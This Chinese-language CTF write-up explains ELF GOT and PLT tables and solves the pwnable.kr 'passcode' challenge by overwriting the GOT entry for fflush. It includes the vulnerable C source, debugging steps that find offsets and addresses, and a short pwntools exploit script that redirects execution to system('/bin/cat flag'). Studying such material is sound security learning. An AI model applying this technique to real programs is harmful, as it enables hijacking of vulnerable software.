## GOT和PLT

### GOT表

概念:每一个外部定义的符号在全局偏移表（Global offset Table）中有相应的条目，GOT位于ELF的数据段中，叫做GOT段。

作用：把位置无关的地址计算重定位到一个绝对地址。程序首次调用某个库函数时，运行时连接编辑器（rtld）找到相应的符号，并将它重定位到GOT之后每次调用这个函数都会将控制权直接转向那个位置，而不再调用rtld。

### PLT表

过程连接表(Procedure Linkage Table)，一个PLT条目对应一个GOT条目

当main()函数开始，会请求plt中这个函数的对应GOT地址，如果第一次调用那么GOT会重定位到plt，并向栈中压入一个偏移，程序的执行回到_init()函数，rtld得以调用就可以定位printf的符号地址，第二次运行程序再次调用这个函数时程序跳入plt，对应的GOT入口点就是真实的函数入口地址。

动态连接器并不会把动态库函数在编译的时候就包含到ELF文件中,仅仅是在这个ELF被加载的时候,才会把那些动态函库数代码加载进来,之前系统只会在ELF文件中的GOT中保留一个调用地址.

## GOT覆写

### PLT能覆写吗？

既然GOT能覆写，那么PLT能覆写吗？答案是不能，本文基于以下的代码(具体可参考<https://pwnable.kr/index.php#>)

`//源代码passcode.c`

``

`#include<stdio.h>`

``

`#include<stdlib.h>`

``

`voidlogin(){`

``

`intpasscode1;`

``

`intpasscode2;`

``

`printf("enter passcode1 : ");`

``

`scanf("%d",passcode1);`

``

`fflush(stdin);`

``

`// ha! mommy told me that 32bit is vulnerable to bruteforcing :)`

``

`printf("enter passcode2 : ");`

``

`scanf("%d",passcode2);`

``

`printf("checking...n");`

``

`if(passcode1==338150&&passcode2==13371337){`

``

`printf("Login OK!n");`

``

`system("/bin/cat flag");`

``

`}`

``

`else{`

``

`printf("Login Failed!n");`

``

`exit(0);`

``

`}`

``

`}`

``

`voidwelcome(){`

``

`charname[100];`

``

`printf("enter you name : ");`

``

`scanf("%100s",name);`

``

`printf("Welcome %s!n",name);`

``

`}`

``

`intmain(){`

``

`printf("Toddler's Secure Login System 1.0 beta.n");`

``

`welcome();`

``

`login();`

``

`// something after login...`

``

`printf("Now I can safely trust you that you have credential :)n");`

``

`return0;`

``

`}`

``

使用gcc编译：

![image.png](https://image.3001.net/images/20200630/15935288692237.png!small)

注意这里的编译警告。大概意思是说scanf的第二个参数类型应该是int*，而实际上是int。而这正是实现GOT覆写的地方，稍后会介绍。这里主要说下PLT为何不能够覆写。通过objdump-h
pwnme命令可以查看可执行文件(pwnme)的节的信息：

![image.png](https://image.3001.net/images/20200630/15935288841515.png!small)

我们注意到.plt节是REAONLY的，显然，这是没有办法修改的，而.got节是没有READONLY属性的，是可以修改。关于ELF文件和各个节的含义会在后续文章中介绍。

### 深入分析scanf

一个简单的scanf代码，功能是通过输入设置a的值。

`#include<stdio.h>`

``

`intmain(){`

``

`inta;`

``

`printf("%x\n",a);`

``

`scanf("%d",&a);`

``

`fflush(stdin);`

``

`}`

``

通过调试可知，当输入5的时候，在0xffac6a78地址的地方存放着输入的5，这正是变量a的值。

![image.png](https://image.3001.net/images/20200630/15935288946599.png!small)

如果写成scanf("%d",a)会怎么样子那？除了警告之外，还会发生什么？按照上面的分析，a应该会被当作地址来处理的，如果a是一个got表项的地址，那么不就能够实现覆写了吗？

### GOT覆写

首先查看以flag信息，我们要利用GOT覆写技术来实现获取flag信息。查看flag文件的信息如下：

![image.png](https://image.3001.net/images/20200630/1593528904406.png!small)  

查看flag的内容可知是"无情剑客"。检查pwnme采用的保护措施，使用checksec，如下所示，禁用了PIE，禁用NX。

![image.png](https://image.3001.net/images/20200630/1593528912973.png!small)

使用radare2对pwnme进行调试分析查看welcome函数的汇编代码，可知ebp-6ch就是我们在函数中定义的name。

![image.png](https://image.3001.net/images/20200630/15935289208637.png!small)

查看寄存器的值，注意观察ebp的值。

![image.png](https://image.3001.net/images/20200630/15935289291799.png!small)

查看login函数的汇编代码。

![image.png](https://image.3001.net/images/20200630/15935289397479.png!small)

在第一个scanf打断点，查看ebp的值：

![image.png](https://image.3001.net/images/20200630/15935289498495.png!small)

通过观察可知，两者的ebp的值是一样的。通过分析汇编代码可知name,password1,password2等相对于ebp的偏移分别是6ch,ch,10h。

`High`

``

`Address||`

``

`+-----------------+`

``

`|args|`

``

`+-----------------+`

``

`|returnaddress|`

``

`+-----------------+`

``

`ebp|old ebp|`

``

`+-----------------+`

``

`|...|`

``

`+-----------------+`

``

`ebp-ch||password1的地址`

``

`+-----------------+`

``

`ebp-10h||password2的地址`

``

`+-----------------+`

``

`|...|`

``

`+-----------------+`

``

`ebp-6ch||name的起始地址`

``

`+-----------------+`

``

`Low||`

``

`Address`

``

如果我们的name足够长，覆盖到password1变量的地址，就能够控制password1的值的吗？通过计算6ch-ch=60h=96可知name和password1相差96个字符。

通过上面对scanf的分析，当输入的变量没有用取地址符号&，导致读入数据的时候，scanf会把这个变量中的值当成存储地址来存放数据，name值的最后4个字节是passcode1值，所以可以通过将passcode1的值改为fflush()的地址，scanf()之后会调用fflush()函数，覆盖fflush()在GOT表中的内容，把system(“/bin/cat
flag”)对应汇编代码地址写入fflush()中，当这个函数被调用时，就会直接执行system(“/bin/cat flag”)。

通过objection-R pwnme查看GOT表可知fflush的地址为0x0804a010。

![image.png](https://image.3001.net/images/20200630/15935289582357.png!small)

通过login的汇编代码可知system(“/bin/cat flag”)的地址是0x080485e3。

![image.png](https://image.3001.net/images/20200630/15935289654618.png!small)

### 攻击代码

`#-*- coding: UTF-8 -*-`

``

`#!/usr/bin/python`

``

`from pwnimport*`

``

`p=process('./pwnme')`

``

`fflush_got=0x0804a010`

``

`system_addr=0x80485e3`

``

`payload="A"*96+p32(fflush_got)+str(system_addr)`

``

`p.send(payload)`

``

`p.interactive()`

``

## 参考链接

>
> [elf格式分析](https://www.toutiao.com/i6841578093140771335/)[深入理解GOT表覆写技术](https://www.anquanke.com/post/id/183370)
>
>
> [进一步分析scanf](https://mp.weixin.qq.com/s?__biz=MzI1NjEyMzgxMw==&mid=2247483959&idx=1&sn=fb61273c571feef8b5a3e55d4fdb4291&chksm=ea2a34fddd5dbdebec72fd386abab0cb832bcde458945f4b15a92401af9e4b1cd4caef425168&token=1136230719&lang=zh_CN#rd)

